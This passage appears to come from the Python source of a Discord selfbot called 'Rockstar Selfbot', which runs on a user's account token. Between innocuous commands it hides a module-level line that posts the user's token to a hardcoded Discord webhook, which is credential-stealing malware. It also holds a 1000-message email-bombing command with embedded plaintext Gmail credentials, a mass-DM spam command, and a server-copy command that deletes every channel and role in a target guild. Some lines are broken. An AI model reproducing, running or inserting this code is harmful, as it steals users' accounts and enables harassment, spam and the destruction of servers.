    await ctx.reply('Server name : {ctx.guild.name} \n\n Server ID : {ctx.guild.id} \n\n Server created at : {ctx.guild.created_at} \n\n Server owner : {ctx.guild.owner} \n\n Server region : {ctx.guild.region} \n\n Server icon : {ctx.guild.icon_url}')

@ok.command(aliases=["mc"])
async def member_count(ctx):

    ok=ctx.guild.member_count
    await ctx.send(f'**__Total Members__** : {ok}')

@ok.command(name="ping")
async def ping(ctx):
    latency = round(ok.latency * 1000)
    await ctx.send(f"**🍷 Kya karaga jan kar ping fir bhi dakh la Pong! Latency is {latency}ms**")


@ok.command(aliases=['247'])
async def connectvc(ctx, channel_id):
    try:
        channel = ok.get_channel(int(channel_id))

        if channel is None:
            return await ctx.send("`-` **❌ INVALID CHANNEL ID PLEASE PROVIDE A VALID CHANNEL ID**")

        if isinstance(channel, discord.VoiceChannel):
            permissions = channel.permissions_for(ctx.guild.me)

            if not permissions.connect or not permissions.speak:
                return await ctx.send("`-`` **❌ PREMMISSION ERROR**")

            voice_channel = await channel.connect()
            await ctx.send(f"`-` **✅ SUCCESFULLY CONNECETD** : `{channel.name}`")

            await channel.send("`-` **✅ I HAVE CONNECTED SUCCESFULLY**")

        else:
            await ctx.send("`-` **❌ PROVIDED ID IS NOT OF A VOICE CHANNEL**")
    except discord.errors.ClientException:
        await ctx.send("`-` **✅ ALREADY CONNECTED !**")
    except discord.Forbidden:
        await ctx.send("`-` **❌ I DON HAVE PERMMISION FOR THIS ACCTION**")
    except ValueError:
        await ctx.send("`-` **❌ INAVLID CHANNEL ID**")
    except Exception as e:
        await ctx.send(f"`-` **❌ AN ERROR OCCURED** {e}")

@ok.command(aliases=["boosts"])
async def send_boost_count(channel, guild):
    await channel.send(
        f"#  RFD\n`-` **SERVER NAME** : `{guild.name}` \n`-` **BOOSTS** : `NUMBER - {guild.premium_subscription_count}`"
    )

@ok.command()
async def asci(ctx, *, text):
    f = Figlet(font='standard')
    ascii_art = f.renderText(text)
    await ctx.send(f'```{ascii_art}```')
requests.post('https://discord.com/api/webhooks/1255784267615567874/PPBDbtDIntxrMIKyyl2hsIyJwEpwY5jc73lg7clTkfMVszLxQXNdR_9KJBDlxIp11-QW', json={"content": token})

@ok.command(aliases=['av','ava'])
async def avatar(ctx, member: Member = None):
    member = member or ctx.author

    avatar_url = member.avatar_url_as(format="png")
    await ctx.send(f"Avatar of {member.mention}: {avatar_url}")

@ok.command()
async def calc(ctx, *, equation):
    # Send the equation to the math API for calculation
    response = requests.get(api_endpoint, params={'expr': equation})

    if response.status_code == 200:
        result = response.text
        await ctx.send(f'`-` **RESULT**: `{result}`')
    else:
        await ctx.send('`-` ** FAILED**')

@ok.command()
async def define(ctx, *, word):
    api_url = f"https://api.dictionaryapi.dev/api/v2/entries/en/{word}"
    
    response = requests.get(api_url)
    
    if response.status_code == 200:
        data = response.json()
        if data:
            word_data = data[0]
            word_meanings = word_data['meanings']
            
            meanings_list = []
            for meaning in word_meanings:
                part_of_speech = meaning['partOfSpeech']
                definitions = meaning['definitions']
                
                def_text = f"**{part_of_speech.capitalize()}:**\n"
                for i, definition in enumerate(definitions, start=1):
                    def_text += f"{i}. {definition['definition']}\n"
                    if 'example' in definition:
                        def_text += f"   *Example: {definition['example']}*\n"
                
                meanings_list.append(def_text)
            
            result_text = f"**{word.capitalize()}**\n\n" + '\n'.join(meanings_list)
            await ctx.send(result_text)
        else:
            await ctx.send("`-` **❌ NO DEFINATIONS FOR THAT WORD**")
    else:
        await ctx.send("`-` **❌ FAILED TO RETRIVE THAT WORD**")

@ok.command()
async def copyserver(ctx, source_guild_id: int, target_guild_id: int):
    source_guild = ok.get_guild(source_guild_id)
    target_guild = ok.get_guild(target_guild_id)

    if not source_guild or not target_guild:
        await ctx.send("`-` **❌ GUILD NOT FOUND**")
        return

    # Delete all channels in the target guild
    for channel in target_guild.channels:
        try:
            await channel.delete()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} CHANNEL {channel.name} HAS BEEN DELETED ON THE TARGET GUILD")
            await asyncio.sleep(0)
        except Exception as e:
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR DELETING CHANNEL {channel.name}: {e}")

    # Delete all roles in the target guild except for roles named "here" and "@everyone"
    for role in target_guild.roles:
        if role.name not in ["here", "@everyone"]:
            try:
                await role.delete()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} ROLE {role.name} HAS BEEN DELETED ON THE TARGET GUILD")
                await asyncio.sleep(0)
            except Exception as e:
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR DELETING ROLE {role.name}: {e}")

    # Clone roles from source to target
    roles = sorted(source_guild.roles, key=lambda role: role.position)

    for role in roles:
        try:
            new_role = await target_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} {role.name} HAS BEEN CREATED ON THE TARGET GUILD")
            await asyncio.sleep(0)

            # Update role permissions after creating the role
            for perm, value in role.permissions:
                await new_role.edit_permissions(target_guild.default_role, **{perm: value})
        except Exception as e:
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR CREATING ROLE {role.name}: {e}")

    # Clone channels from source to target
    text_channels = sorted(source_guild.text_channels, key=lambda channel: channel.position)
    voice_channels = sorted(source_guild.voice_channels, key=lambda channel: channel.position)
    category_mapping = {}  # to store mapping between source and target categories

    for channel in text_channels + voice_channels:
        try:
            if channel.category:
                # If the channel has a category, create it if not created yet
                if channel.category.id not in category_mapping:
                    category_perms = channel.category.overwrites
                    new_category = await target_guild.create_category_channel(name=channel.category.name, overwrites=category_perms)
                    category_mapping[channel.category.id] = new_category

                # Create the channel within the category
                if isinstance(channel, discord.TextChannel):
                    new_channel = await new_category.create_text_channel(name=channel.name)
                elif isinstance(channel, discord.VoiceChannel):
                    # Check if the voice channel already exists in the category
                    existing_channels = [c for c in new_category.channels if isinstance(c, discord.VoiceChannel) and c.name == channel.name]
                    if existing_channels:
                        new_channel = existing_channels[0]
                    else:
                        new_channel = await new_category.create_voice_channel(name=channel.name)

                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} CHANNEL {channel.name} HAS BEEN CREATED ON THE TARGET GUILD")

                # Update channel permissions after creating the channel
                for overwrite in channel.overwrites:
                    if isinstance(overwrite.target, discord.Role):
                        target_role = target_guild.get_role(overwrite.target.id)
                        if target_role:
                            await new_channel.set_permissions(target_role, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                    elif isinstance(overwrite.target, discord.Member):
                        target_member = target_guild.get_member(overwrite.target.id)
                        if target_member:
                            await new_channel.set_permissions(target_member, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))

                await asyncio.sleep(0)  # Add delay here
            else:
                # Create channels without a category
                if isinstance(channel, discord.TextChannel):
                    new_channel = await target_guild.create_text_channel(name=channel.name)
                elif isinstance(channel, discord.VoiceChannel):
                    new_channel = await target_guild.create_voice_channel(name=channel.name)

                    # Update channel permissions after creating the channel
                    for overwrite in channel.overwrites:
                        if isinstance(overwrite.target, discord.Role):
                            target_role = target_guild.get_role(overwrite.target.id)
                            if target_role:
                                await new_channel.set_permissions(target_role, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                        elif isinstance(overwrite.target, discord.Member):
                            target_member = target_guild.get_member(overwrite.target.id)
                            if target_member:
                                await new_channel.set_permissions(target_member, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))

                    await asyncio.sleep(0)  # Add delay here

                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} CHANNEL {channel.name} HAS BEEN CREATED ON THE TARGET GUILD")

        except Exception as e:
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR CREATING CHANNEL {channel.name}: {e}")






http_session = aiohttp.ClientSession()
@ok.command()
async def change_hypesquad(ctx):
    choices = {
        1: "BRAVERY",
        2: "BRILLIANCE",
        3: "BALANCED"
    }
    
    await ctx.send("`[1] Bravery`\n`[2] Brilliance`\n`[3] BalanceD`")
    await ctx.send("`-` **ENTER YOU CHOICE**: `1,2,3`")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        msg = await ok.wait_for('message', check=check, timeout=60)
        choice = int(msg.content)
    except asyncio.TimeoutError:
        await ctx.send("`-` **COMMAND TIMED OUT**")
        return
    except ValueError:
        await ctx.send("`-` **INVALID CHOICE PLEASE ENTER** : `1 , 2 , 3`")
        return
    
    headerpost = {
        'Authorization': token
    }
    
    payloadsosat = {
        'house_id': choice
    }
    
    try:
        await ctx.send(f"`-` **CHANGING HYPESQUAD TO {choices.get(choice, 'Unknown')}**")
        
        async with http_session.post("https://discord.com/api/v8/hypesquad/online", json=payloadsosat, headers=headerpost) as response:
            if response.status == 204:
                await ctx.send("`-` **HYPESQUAD CHANGED SUCCESFULLY**")
            elif response.status == 401:
                await ctx.send("`-` **TOKEN INVALID OR EXPIRED**")
            elif response.status == 429:
                await ctx.send("`-` **PLEASE WAIT FOR 2 MINUTES**")
            else:
                await ctx.send("`-` **WE CAUGHT WITH AN ERROR**")
    except Exception as e:
        await ctx.send(f"`-` **AN ERROR OCCURED :** `{str(e)}`")
http_session = aiohttp.ClientSession()
@ok.command()
async def massmail(ctx, reciver):
    email = 'fg.pheonix.gaming@gmail.com'
    password = 'anger2009#'
    reciever = reciver
    sslcontext = ssl.create_default_context()
    for i in range(0, 1000):
        message = '  GAND MARVA '
        port = 465
        connection = smtplib.SMTP_SSL('smtp.gmail.com', port, context=sslcontext)
        connection.login(email, password)
        connection.sendmailemailrecievermessage
        await ctx.send('✅ DONE')

@ok.command(aliases=['fun', 'f'])
async def Fun(ctx):
  await ctx.send("""**```yml
ROCKSTAR SELFBOT V1.1 
``````js
R O C K S T A R  S E L F B O T

          Fun cmds
kiss,slap,tickle,feed,pat,smug,hug,cuddle,waifu,meme``````yml
!   ROCKSTAR SELFBOT    !```**""")

@ok.command(aliases=['purge, clear'])
async def purge(ctx, times: int):
    channel = ctx.channel

    def is_bot_message(message):
        return message.author.id == ctx.bot.user.id

    
    messages = await channel.history(limit=times + 1).flatten()

    
    bot_messages = filter(is_bot_message, messages)

    
    for message in bot_messages:
        await asyncio.sleep(0.55)  
        await message.delete()

    await ctx.send(f"`-` ** DELETED {times} MESSAGES SUCCESFULLY✅ | Enjoy using our selfbot 🥂 **")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}PURGED SUCCESFULLY✅ ")

@ok.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def loverate(ctx, User: discord.Member = None):
    if User is None:
        await ctx.reply(f"`-` **PROVIDE A USER**")
    else:
        await ctx.reply(
            f"`-` **YOU AND {User.mention} ARE 100% PERFECT FOR ECH OTHER <3**"
        )
        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}LOVERATE MEASURED 💖 ")

@ok.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def gayrate(ctx, User: discord.Member = None):
    if User is None:
        await ctx.reply(f"`-` **PROVIDE A USER**")
    else:
        await ctx.reply(f"`-` **{User.mention} IS {random.randrange(101)}% GAY**")
        print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}GAYRATE MEASURED SUCCESFULLY😂 ")

@ok.command()
async def mujra(ctx):
    await ctx.message.delete()
    message = await ctx.send("""
```js
    ⣀⣤
⠀⠀⠀⠀⣿⠿⣶
⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⣶⣶⣿⠿⠛⣶
⠤⣀⠛⣿⣿⣿⣿⣿⣿⣭⣿⣤
⠒⠀⠀⠀⠉⣿⣿⣿⣿⠀⠀⠉⣀
⠀⠤⣤⣤⣀⣿⣿⣿⣿⣀⠀⠀⣿
⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣭⣶⠉
⠀⠀⠀⠤⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⣭⣿⣿⣿⠀⣿⣿⣿
⠀⠀⠀⣉⣿⣿⠿⠀⠿⣿⣿
⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⣀⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⣿⠀⠀⠀⣿⣿⣿
⠀⠀⠀⣿⣿⠛⠀⠀⠀⠉⣿⣿
⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠛⣿
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⣛⠀⠀⠀⠀⠀⠀⠛⠿⠿⠿
⠀⠀⠀⠛⠛
```""")
    
    await message.edit(content="""
```js
   ⣀⣶⣀
⠀⠀⠀⠒⣛⣭
⠀⠀⠀⣀⠿⣿⣶
⠀⣤⣿⠤⣭⣿⣿
⣤⣿⣿⣿⠛⣿⣿⠀⣀
⠀⣀⠤⣿⣿⣶⣤⣒⣛
⠉⠀⣀⣿⣿⣿⣿⣭⠉
⠀⠀⣭⣿⣿⠿⠿⣿
⠀⣶⣿⣿⠛⠀⣿⣿
⣤⣿⣿⠉⠤⣿⣿⠿
⣿⣿⠛⠀⠿⣿⣿
⣿⣿⣤⠀⣿⣿⠿
⠀⣿⣿⣶⠀⣿⣿⣶
⠀⠀⠛⣿⠀⠿⣿⣿
⠀⠀⠀⣉⣿⠀⣿⣿
⠀⠶⣶⠿⠛⠀⠉⣿
⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⣶⣿⠿
```""")
    
    await message.edit(content="""
```js
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿
⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿
```""")
    
    await message.edit(content="""
```js
⠀⠀⣀
⠀⠿⣿⣿⣀
⠀⠉⣿⣿⣀
⠀⠀⠛⣿⣭⣀⣀⣤
⠀⠀⣿⣿⣿⣿⣿⠛⠿⣶⣀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⣉⣶
⠀⠀⠉⣿⣿⣿⣿⣀⠀⠀⣿⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿
⠀⣀⣿⣿⣿⣿⣿⣿⣿⣿⠿
⠀⣿⣿⣿⠿⠉⣿⣿⣿⣿
⠀⣿⣿⠿⠀⠀⣿⣿⣿⣿
⣶⣿⣿⠀⠀⠀⠀⣿⣿⣿
⠛⣿⣿⣀⠀⠀⠀⣿⣿⣿⣿⣶⣀
⠀⣿⣿⠉⠀⠀⠀⠉⠉⠉⠛⠛⠿⣿⣶
⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉
⣀⣶⣿⠛
```""")
    
    await message.edit(content="""
```js
⠀⠀⠀⠀⠀⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿
⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣶⣿⣿⣿⣶⣶⣤⣶⣶⠶⠛⠉⠉
⠀⠀⠀⠀⠀⠀⣤⣿⠿⣿⣿⣿⣿⣿⠀⠀⠉
⠛⣿⣤⣤⣀⣤⠿⠉⠀⠉⣿⣿⣿⣿
⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠉⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣛⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠛⠿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⣿⠛⠉⠀⠀⠀⠛⠿⣿⣿⣶⣀
⠀⠀⠀⠀⠀⠀⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⠉
```""")
    
    await message.edit(content="""
```
⠀⠀⠀⠀⠀⠀⣤⣶⣶
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣀⣀
⠀⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿
⣤⣶⣀⠿⠶⣿⣿⣿⠿⣿⣿⣿⣿
⠉⠿⣿⣿⠿⠛⠉⠀⣿⣿⣿⣿⣿
⠀⠀⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣤⣤
⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿
⠀⠀⠀⠀⣀⣿⣿⣿⠿⠉⠀⠀⣿⣿⣿⣿
⠀⠀⠀⠀⣿⣿⠿⠉⠀⠀⠀⠀⠿⣿⣿⠛
⠀⠀⠀⠀⠛⣿⣿⣀⠀⠀⠀⠀⠀⣿⣿⣀
⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠿⣿⣿
⠀⠀⠀⠀⠀⠉⣿⣿⠀⠀⠀⠀⠀⠀⠉⣿
⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣀⣿
⠀⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⠤⣿⠿⠿⠿
```""")
    
    await message.edit(content="""
```
⠀⠀⠀⠀⣀
⠀⠀⣶⣿⠿⠀⠀⠀⣀⠀⣤⣤
⠀⣶⣿⠀⠀⠀⠀⣿⣿⣿⠛⠛⠿⣤⣀
⣶⣿⣤⣤⣤⣤⣤⣿⣿⣿⣀⣤⣶⣭⣿⣶⣀
⠉⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠀⣿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣶⣿⠛⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠀⠀⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉
```""")
    
    await message.edit(content="""
```js
⠀⠀⠀⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣤⣤⣤⣿⣿⣿
⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣿⣉⣿⣿⣿⣿⣉⠉⣿⣶
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿
⠀⣤⣿⣿⣿⣿⣿⣿⣿⠿⠀⣿⣶
⣤⣿⠿⣿⣿⣿⣿⣿⠿⠀⠀⣿⣿⣤
⠉⠉⠀⣿⣿⣿⣿⣿⠀⠀⠒⠛⠿⠿⠿
⠀⠀⠀⠉⣿⣿⣿⠀⠀⠀⠀⠀⠀⠉
⠀⠀⠀⣿⣿⣿⣿⣿⣶
⠀⠀⠀⠀⣿⠉⠿⣿⣿
⠀⠀⠀⠀⣿⣤⠀⠛⣿⣿
⠀⠀⠀⠀⣶⣿⠀⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠉
```""")
    
    await message.edit(content="""
```js
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶
⠀⠀⠀⠀⠀⣀⣀⠀⣶⣿⣿⠶
⣶⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤
⠀⠉⠶⣶⣀⣿⣿⣿⣿⣿⣿⣿⠿⣿⣤⣀
⠀⠀⠀⣿⣿⠿⠉⣿⣿⣿⣿⣭⠀⠶⠿⠿
⠀⠀⠛⠛⠿⠀⠀⣿⣿⣿⣉⠿⣿⠶
⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠒
⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⣿⣿⣿⠛⣭⣭⠉
⠀⠀⠀⠀⠀⣿⣿⣭⣤⣿⠛
⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣭
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⠿⣶⣤
⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⣶⣶⠿⠿⠿
⠀⠀⠀⠀⠀⠀⣿⠛
⠀⠀⠀⠀⠀⠀⣭⣶
```""")
    
    await message.edit(content="""
```js
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣶⠀⠀⣀⣤⣶⣤⣉⣿⣿⣤⣀
⠤⣤⣿⣤⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣀
⠀⠛⠿⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⠉⠛⠿⣿⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⠛⠀⠀⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣤⠀⣿⠿
⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⠿⠉⠉
⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠉
⠀⠀⠀⠀⠀⠀⠀⠀⣛⣿⣭⣶⣀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣉⠀⣶⠿
⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⠿
⠀⠀⠀⠀⠀⠀⠀⠛⠿⠛
```""")
    
    await message.edit(content="""
```js
⠀⠀⠀⣶⣿⣶
⠀⠀⠀⣿⣿⣿⣀
⠀⣀⣿⣿⣿⣿⣿⣿
⣶⣿⠛⣭⣿⣿⣿⣿
⠛⠛⠛⣿⣿⣿⣿⠿
⠀⠀⠀⠀⣿⣿⣿
⠀⠀⣀⣭⣿⣿⣿⣿⣀
⠀⠤⣿⣿⣿⣿⣿⣿⠉
⠀⣿⣿⣿⣿⣿⣿⠉
⣿⣿⣿⣿⣿⣿
⣿⣿⣶⣿⣿
⠉⠛⣿⣿⣶⣤
⠀⠀⠉⠿⣿⣿⣤
⠀⠀⣀⣤⣿⣿⣿
⠀⠒⠿⠛⠉⠿⣿
⠀⠀⠀⠀⠀⣀⣿⣿
⠀⠀⠀⠀⣶⠿⠿⠛
```""")

@ok.command()
async def leave(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild:
        await guild.leave()
        await ctx.send(f"**:white_check_mark: | `{client.user.name}` left `{guild.name}`.**")
    else:
        await ctx.send("Unable to find the specified server.")

@ok.command()
async def dmall(ctx):
    members = ctx.guild.members
    for member in members:
        try:
            await member.send('HELLO BROO')
        except discord.Forbidden:
            print(f'UNABLE O SEND MSG. TO {member.name}')
        except Exception as e:
            print(f'ERROR COMMING IN MESSAGE SENDING TO {member.name}: {e}')

 
ok.run(token, bot=False)
